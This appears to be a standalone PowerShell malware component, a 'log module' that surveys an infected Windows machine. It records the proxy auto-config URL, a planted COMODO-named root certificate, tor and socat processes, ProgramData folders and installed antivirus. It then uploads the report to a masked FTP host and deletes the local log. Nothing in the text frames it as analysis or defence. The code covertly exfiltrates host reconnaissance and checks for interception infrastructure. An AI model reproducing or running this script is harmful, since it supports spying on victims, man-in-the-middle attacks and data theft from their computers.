$Logfile = $env:Temp+"\\$(gc env:computername).log";

Function LogWrite
{
  Param ([string]$logstring)
  $dt=Get-Date -Format "dd.MM.yyyy HH:mm:ss";
  $msg=[string]::Format("[{0}]::[{1}]",$dt,$logstring);
  Write-Host $msg;
  Add-content $Logfile -value $msg;
}
Function UploadLog
{
  $dest = "ftp://XXXXXXX@XXXX/XXX/XXX";
  $webclient = New-Object -TypeName System.Net.WebClient;
  $webclient.UploadFile("$dest/$(gc env:computername).log", $Logfile);
  Remove-Item -Path $Logfile;
}
function CheckInstall(){
  $wininfo = (Get-WmiObject Win32_OperatingSystem | Select Caption, ServicePackMajorVersion, OSArchitecture, Version, MUILanguages);
  $wininfo.MUILanguages=$wininfo.MUILanguages -join ",";
  LogWrite("OS info: {0}" -f $wininfo -join "");
  if (test-path variable:psversiontable) {
    $version = $psversiontable.psversion;
  } else {
    $version = [version]"1.0.0.0";
  }
  LogWrite("Powershell version: {0}" -f $version);
  try {
    $pac=Get-ItemProperty 'hkcu:\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\'|Select -expand AutoConfigURL -ErrorAction Stop;
    LogWrite("Pac setted: '$pac'");
  }
  catch {
    LogWrite("ERROR: Pac not setted");
  }
  $Certs = @(Get-ChildItem cert:\CurrentUser\ROOT|Where-Object {$_.Subject -like "*COMODO RSA Extended Validation Secure Server CA 2*"}|ForEach-Object {"{0} ({1})" -f ($_.Thumbprint,$_.NotBefore)});
  if (-NOT $Certs.count -eq 0){
    LogWrite("Certs installed: '{0}'" -f ($Certs -join "; "));
  }else {
    LogWrite("Certs not found");
  }
  try{
    $proc = Get-Process | Where-Object {$_.ProcessName -like "tor*" -or $_.ProcessName -like "socat*"}|Select -Property @{ Name="Out"; Expression={"ID:{0}`nName:{1}`nPath:{2}`n-------------" -f $_.Id,$_.ProcessName,$_.Path}}|Select -expand Out;
    LogWrite("Proccess list:`n{0}" -f ($proc -join "`n"));
  }
  catch {
    LogWrite("ERROR: Can't get proccess list");
  }
  $DestTP=$env:ALLUSERSPROFILE;
  try{
    $dirs=dir($DestTP) -ErrorAction Stop;
    LogWrite("List dir [{0}]: {1}" -f ($DestTP, (($dirs|Select -expand Name) -join "; ")));
    foreach($dir in $dirs){
        try{
            $subdir=dir($dir.FullName) -ErrorAction Stop;
            LogWrite("List dir [{0}]:{1}" -f ($dir.FullName, (($subdir|Select -expand Name) -join "; ")));
        }
        catch{
            LogWrite("ERROR: Can't list dir {0}" -f $dir.FullName);
        }
    }
  }
  catch {
    LogWrite("ERROR: Can't list dir {0}" -f $DestTP);
  }

  $avlist=(Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct"  @psboundparameters|Select -expand DisplayName);
  if (-NOT $avlist.count -eq 0){
    LogWrite("Av installed: '{0}'" -f ($avlist -join "; "));
  }else {
    LogWrite("Av not found");
  }
}
function StartWork(){
  LogWrite "Start Log module";
  CheckInstall;
  UploadLog;
}
StartWork;
